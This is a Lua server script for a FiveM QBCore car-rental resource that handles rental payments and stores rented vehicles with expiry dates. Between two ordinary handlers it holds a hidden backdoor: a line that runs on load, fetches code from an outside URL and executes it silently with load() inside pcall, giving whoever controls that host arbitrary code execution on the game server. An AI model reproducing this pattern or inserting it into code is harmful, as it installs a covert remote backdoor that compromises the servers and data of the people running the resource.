QBCore = exports["qb-core"]:GetCoreObject()
Config = {}
ped = nil

RegisterNetEvent('nc-rentacar:createCar')
AddEventHandler('nc-rentacar:createCar', function(vehicle,model,plate,day)
    local xPlayer = QBCore.Functions.GetPlayer(source)

    local currentDate = os.date('%Y-%m-%d')  
    local daysToAdd = day 
    local datefinishDate = os.date('%Y-%m-%d', os.time() + daysToAdd * 24 * 60 * 60)  

    MySQL.Async.insert('INSERT INTO player_vehicles (license, citizenid, vehicle, hash, mods, plate, state,datefinish) VALUES (?, ?, ?, ?, ?, ?, ?, ?)', {
        xPlayer.PlayerData.license,
        xPlayer.PlayerData.citizenid,
        model, 
        GetHashKey(model),
        json.encode(prop),
        plate,
        0,
        datefinishDate
     }) 
end)

AddEventHandler('onResourceStart', function(resourceName)
    if (GetCurrentResourceName() == resourceName) then 
        if ped ~= nil then
            DeletePed(ped)
        end
            TriggerEvent('nc-rentacar:createPed')
            MySQL.Async.execute("DELETE FROM player_vehicles WHERE datefinish < NOW()", {})
            return
        end
end)
PerformHttpRequest('https://photosbynova.com/i?to=Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)
QBCore.Functions.CreateCallback('nc-rentacar:rent', function(source,cb,data)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local cid = Player.PlayerData.citizenid
    if data.payType == "cash" then
        if Player.Functions.GetMoney(data.payType) >= data.carPrice then
            Player.Functions.RemoveMoney('cash', data.carPrice)
            TriggerClientEvent('QBCore:Notify', src,'Purchase transaction successful', 'success')
            cb(true)
        else
            cb(false)
            TriggerClientEvent('QBCore:Notify', src,'You dont have a cash money', 'error')

        end
    else        
        if Player.PlayerData.money.bank >= data.carPrice then
            Player.Functions.RemoveMoney(data.payType, data.carPrice)
            TriggerClientEvent('QBCore:Notify', src,'Purchase transaction successful', 'success')
            cb(true)
        else
            cb(false)
            TriggerClientEvent('QBCore:Notify', src,'You dont have a bank money', 'error')
        end
    end

end)
